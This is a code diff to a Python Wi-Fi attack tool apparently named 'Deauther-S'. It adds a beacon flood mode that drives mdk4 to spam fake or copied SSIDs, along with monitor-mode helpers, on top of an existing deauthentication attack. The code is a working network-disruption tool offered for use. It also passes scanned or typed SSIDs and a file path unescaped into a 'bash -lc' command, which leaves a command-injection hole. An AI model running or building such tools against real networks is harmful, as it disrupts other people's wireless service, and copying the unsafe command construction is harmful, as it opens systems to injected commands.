@@ -70,6 +70,32 @@ def print_banner():
 {Fore.RESET}      Deauther-S | Dx4 and JonX
 """ + Style.RESET_ALL)
 
+def check_monitor_mode(iface):
+    """Check if the specified interface is in monitor mode."""
+    try:
+        result = subprocess.run(["iw", iface, "info"], capture_output=True, text=True, check=True)
+        for line in result.stdout.splitlines():
+            if "type" in line:
+                if "monitor" in line:
+                    return True
+                else:
+                    return False
+        return False
+    except subprocess.CalledProcessError:
+        err(f"Failed to get info for interface {iface}")
+        sys.exit(1)
+
+def start_monitor_mode(iface):
+    """Set the specified interface to monitor mode."""
+    info(f"Setting interface {iface} to monitor mode...")
+    try:
+        subprocess.run(["ip", "link", "set", iface, "down"], check=True)
+        subprocess.run(["iw", iface, "set", "monitor", "none"], check=True)
+        subprocess.run(["ip", "link", "set", iface, "up"], check=True)
+        ok(f"Interface {iface} is now in monitor mode.")
+    except subprocess.CalledProcessError as e:
+        err(f"Failed to set monitor mode on {iface}: {e}")
+        sys.exit(1)
 
 def uninstall_script():
     print_banner()
@@ -82,6 +108,81 @@ def uninstall_script():
     else:
         warn(f"No installation found at {SHORTCUT_PATH}")
     sys.exit(0)
+
+def start_beacon_flood(iface):
+    """Launch mdk4 beacon flood inside xterm."""
+    print(Fore.CYAN + Style.BRIGHT + "\n----- Beacon Flood Mode -----" + Style.RESET_ALL)
+    print(f"{Fore.YELLOW}1. {Fore.RESET}Enter SSID manually")
+    print(f"{Fore.YELLOW}2. {Fore.RESET}Select from scanned APs")
+    print(f"{Fore.YELLOW}3. {Fore.RESET}Random SSIDs")
+    print(f"{Fore.YELLOW}4. {Fore.RESET}Use SSIDs from a wordlist file")
+    print()
+
+    match input_field("Choose SSID option (1-4): "):
+        case "1":
+            ssid = input_field("Enter SSID to flood: ")
+            ssid = f"-n '{ssid}'"
+            mode = "Manual SSID"
+        case "2":
+            csv_file = run_airodump_scan(iface)
+            aps = parse_airodump_csv(csv_file)  
+            if not aps:
+                err(f"No APs found in scan!")
+                return
+            _, _, _, ssid = interactive_choose(aps)
+            ssid = f"-n '{ssid}'"
+            mode = "Scanned AP SSID"
+        case "3":
+            ssid = ""
+            mode = "Random SSIDs"
+        case "4":
+            wordlist_path = input_field("Enter path to wordlist file: ")
+            if not os.path.isfile(wordlist_path):
+                err(f"File not found: {wordlist_path}")
+                return
+            ssid = f"-f {wordlist_path}"
+            mode = "Wordlist SSIDs"
+        case _:
+            err("[!] Invalid choice." + Style.RESET_ALL)
+            return
+    cmd_str = f"mdk4 {iface} b {ssid} -s 9999"
+
+    #check and set monitor mode
+    if not check_monitor_mode(iface):
+        start_monitor_mode(iface)
+
+    print(f"\n{Fore.CYAN}{Style.BRIGHT}----- Information -----{Style.NORMAL}")
+    info(f"Mode             : {mode}")
+    info(f"Target SSID      : {ssid if ssid else 'Random SSIDs'}")
+    info(f"Interface        : {iface}")
+    print()
+
+    info(f"Attacking...")
+    info(f"Press CTRL+C to stop the attack...")
+
+    cmd = [
+        "xterm",
+        "-geometry", "100x24-0-0",
+        "-fg", "red",
+        "-bg", "black",
+        "-e", "bash", "-lc",
+        cmd_str
+    ]
+
+    p = None
+    try:
+        p = subprocess.Popen(cmd)
+        p.wait()
+    except KeyboardInterrupt:
+        ok(f"Attack stopped by user.")
+    finally:
+        if p:
+            try:
+                p.terminate()
+            except:
+                pass
+        
+        ok(f"Attack stopped.")
 
 def start_deauth(bssid, channel, iface):
     """Launch mdk4 or aireplay-ng inside xterm based on user's choice."""
@@ -228,11 +329,13 @@ def interactive_choose(aps):
         err(f"Invalid choice!")
         sys.exit(1)
 
-    return aps[choice][0], aps[choice][1]
+    return aps[choice][0], aps[choice][1], aps[choice][2], aps[choice][3]
 
 def main():
     parser = argparse.ArgumentParser(description="Simple Deauth Tool by Dx4 and JonX")
     parser.add_argument("-i", "--iface", help="Wireless interface (ex: wlan0)")
+    # New feature beacon flood
+    parser.add_argument("-b", "--beacon", action="store_true", help="Enable beacon flood mode")
     parser.add_argument("--cleanup", action="store_true", help="Cleanup temporary files and exit")
     parser.add_argument("--uninstall", action="store_true", help="Uninstall the deauther shortcut")
     args = parser.parse_args()
@@ -255,17 +358,20 @@ def main():
     if not validate_interface(args.iface):
         return
 
-    csv_file = run_airodump_scan(args.iface)
-    aps = parse_airodump_csv(csv_file)
+    if not args.beacon:
+        csv_file = run_airodump_scan(args.iface)
+        aps = parse_airodump_csv(csv_file)
 
-    if not aps:
-        err(f"No APs found in scan!")
-        return
+        if not aps:
+            err(f"No APs found in scan!")
+            return
 
-    target_bssid, channel = interactive_choose(aps)
-    bssid = target_bssid
+        target_bssid, channel, _, _, = interactive_choose(aps)
+        bssid = target_bssid
 
-    start_deauth(bssid, channel, args.iface)
+        start_deauth(bssid, channel, args.iface)
+    else:
+        start_beacon_flood(args.iface)
 
 if __name__ == "__main__":
     main()
